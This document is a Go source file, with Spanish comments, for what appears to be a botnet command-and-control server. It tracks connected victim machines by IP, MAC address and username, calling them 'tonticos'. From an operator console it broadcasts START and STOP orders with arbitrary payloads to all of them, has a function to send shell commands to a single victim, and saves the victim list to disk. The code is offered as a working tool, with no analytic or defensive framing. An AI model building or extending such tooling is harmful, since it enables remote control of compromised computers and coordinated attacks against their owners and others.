package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ClientInfo struct {
	IP        string    `json:"ip"`
	MAC       string    `json:"mac"`
	Username  string    `json:"username"`
	Connected time.Time `json:"connected"`
}

type Client struct {
	Conn *websocket.Conn
	Info ClientInfo
}

var (
	clients   = make(map[*websocket.Conn]Client)
	clientsMu sync.Mutex
	upgrader  = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
)

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	var info ClientInfo
	if err := conn.ReadJSON(&info); err != nil {
		return
	}
	info.Connected = time.Now()

	clientsMu.Lock()
	clients[conn] = Client{Conn: conn, Info: info}
	clientsMu.Unlock()

	log.Println("🟢 - tontin conectao:", info.Username, info.IP)

	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			clientsMu.Lock()
			delete(clients, conn)
			clientsMu.Unlock()
			break
		}
	}
}

func broadcast(action, payload string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	msg := map[string]string{
		"action": action,
	}

	if payload != "" {
		msg["payload"] = payload
	}

	for conn := range clients {
		_ = conn.WriteJSON(msg)
	}
}

func listClients() {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	fmt.Println("tonticos conectados:")
	i := 1
	for _, client := range clients {
		fmt.Printf("%d. %s (%s) - %s\n", i, client.Info.Username, client.Info.IP, client.Info.Connected)
		i++
	}
}

func sendShellCommandToClient(client *websocket.Conn, command string) {
	msg := map[string]string{
		"action":  "SHELL",
		"payload": command,
	}
	if err := client.WriteJSON(msg); err != nil {
		log.Printf("error al enviar comando %s: %v", client.RemoteAddr(), err)
	}
}

// =======================
//
//	Aquí van las órdenes que se pueden recibir de la centralita
func consoleLoop() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("\n[s] START  [x] STOP  [l] LISTAR TONTICOS  [q] SALIR > ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		switch cmd {
		case "s":
			fmt.Print("payload: ")
			payload, _ := reader.ReadString('\n')
			payload = payload[:len(payload)-1]

			broadcast("START", payload)
			fmt.Println("START enviado")

		case "x":
			broadcast("STOP", "")
			fmt.Println("STOP enviado")

		case "l":
			listClients()
			fmt.Print("selecciona tontico (número): ")
			numStr, _ := reader.ReadString('\n')
			numStr = strings.TrimSpace(numStr)

			// control de errores
			numStr = strings.ReplaceAll(numStr, ".", "")
			numStr = strings.TrimSpace(numStr)

			num, err := strconv.Atoi(numStr) // string a int
			if err != nil || num < 1 || num > len(clients) {
				fmt.Println("Número inválido")
				continue
			}

			// obtener cliente y enviar el comando de shell
			client := getClientByIndex(num - 1)
			if client != nil {
				// sendShellCommandToClient(client)
				fmt.Println("shell enviado.")
			} else {
				fmt.Println("no encontrado.")
			}

		case "q":
			saveClientsToFile(time.Now().String() + "clientes_activos.json")
			os.Exit(0)
		}
	}
}

func getClientByIndex(index int) *websocket.Conn {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	i := 0
	for conn := range clients {
		if i == index {
			return conn
		}
		i++
	}
	return nil
}

func saveClientsToFile(filename string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	list := []ClientInfo{}
	for _, c := range clients {
		list = append(list, c.Info)
	}

	data, _ := json.MarshalIndent(list, "", "  ")
	_ = os.WriteFile(filename, data, 0644)
}

func main() {
	http.HandleFunc("/ws", wsHandler)
	go consoleLoop()

	log.Println("scatter :42069")
	log.Fatal(http.ListenAndServe(":42069", nil))
}
